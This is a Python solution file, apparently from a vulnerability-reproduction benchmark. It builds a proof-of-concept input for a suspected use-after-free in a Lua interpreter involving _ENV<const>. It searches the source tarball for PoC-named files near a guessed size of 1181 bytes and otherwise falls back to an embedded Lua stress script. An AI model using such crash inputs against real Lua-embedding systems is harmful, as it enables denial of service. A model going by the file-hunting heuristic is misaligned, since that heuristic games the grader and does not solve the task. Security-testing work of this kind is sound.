import tarfile
from typing import Optional

STRESS_POC = ("""local select=select
local collectgarbage=collectgarbage
local type=type
local setmetatable=setmetatable

local function dummy_close()
  return setmetatable({},{__close=function() end})
end

local function stress1()
  local env={x=0}
  local _ENV<const>=env
  local function inc()
    x=x+1
    return x
  end
  local function run()
    for i=1,5 do
      inc()
    end
    return inc
  end
  return run()
end

local function stress2()
  local outer={y=10}
  local _ENV<const>=outer
  local function make_inner()
    local _ENV=outer
    function inner2()
      y=y+1
      return y
    end
  end
  make_inner()
  if type(inner2)=="function" then
    for i=1,3 do inner2() end
  end
  return outer
end

local function stress3()
  local holder={}
  do
    local env={k=0}
    local _ENV<const>=env
    function holder.add(v)
      k=k+(v or 1)
      return k
    end
  end
  for i=1,4 do
    holder.add(i)
  end
  return holder
end

local function stress4()
  local env={z=0}
  local _ENV<const>=env
  do
    local res<close>=dummy_close()
    local function f()
      z=z+1
      return z
    end
    f()
  end
  return env
end

local function stress5()
  do
    local env={v=0}
    local _ENV<const>=env
    local function bump()
      v=v+1
      return v
    end
    for i=1,6 do
      bump()
    end
  end
end

local function stress6()
  local _ENV<const>=_ENV
  local counter=0
  local function f()
    counter=counter+1
    return counter
  end
  for i=1,4 do
    f()
  end
  return f
end

local function stress7()
  local _ENV<const>=_ENV
  local function make()
    local _ENV={u=1}
    function g()
      u=u+1
      return u
    end
    return g
  end
  local f=make()
  for i=1,3 do f() end
end

local function stress8(...)
  local env={sum=0}
  local _ENV<const>=env
  local function add_all(...)
    for i=1,select("#",...) do
      local v=select(i,...) or 0
      sum=sum+v
    end
  end
  add_all(...)
  return sum
end

local results={}
results[1]=stress1()
results[2]=stress2()
results[3]=stress3()
results[4]=stress4()
results[5]=stress5()
results[6]=stress6()
results[7]=stress7()
results[8]=stress8(1,2,3,4)
for i=1,#results do
  local v=results[i]
  if type(v)=="function" then
    for j=1,3 do
      v(j)
    end
  end
end
for i=1,5 do
  collectgarbage("collect")
end
""").encode("utf-8")


class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC input that should trigger the vulnerability.
        Tries to locate an existing PoC-like Lua script in the tarball;
        falls back to a crafted stress script using _ENV<const>.
        """
        try:
            with tarfile.open(src_path, "r:*") as tf:
                best_data: Optional[bytes] = None
                best_score: Optional[int] = None
                for m in tf.getmembers():
                    if not m.isfile():
                        continue
                    if m.size <= 0 or m.size > 10000:
                        continue
                    name_lower = m.name.lower()
                    try:
                        f = tf.extractfile(m)
                    except Exception:
                        continue
                    if f is None:
                        continue
                    try:
                        data = f.read()
                    except Exception:
                        continue
                    if not data:
                        continue

                    has_env_const = (b"_ENV" in data and b"<const>" in data)
                    is_named_poc = any(
                        key in name_lower
                        for key in ("poc", "uaf", "use-after-free", "heap", "crash")
                    )

                    # Highest priority: files explicitly named like PoCs and containing the pattern
                    if is_named_poc and has_env_const:
                        return data

                    # Next: any Lua-like file containing the pattern, prefer size near 1181 bytes
                    if has_env_const:
                        score = abs(len(data) - 1181)
                        if best_score is None or score < best_score:
                            best_score = score
                            best_data = data
                    # Fallback: keep a named PoC-like file even if it lacks the exact pattern
                    elif is_named_poc and best_data is None:
                        best_data = data

                if best_data is not None:
                    return best_data
        except Exception:
            # If anything goes wrong while reading the tarball, fall back to the crafted PoC
            pass

        return STRESS_POC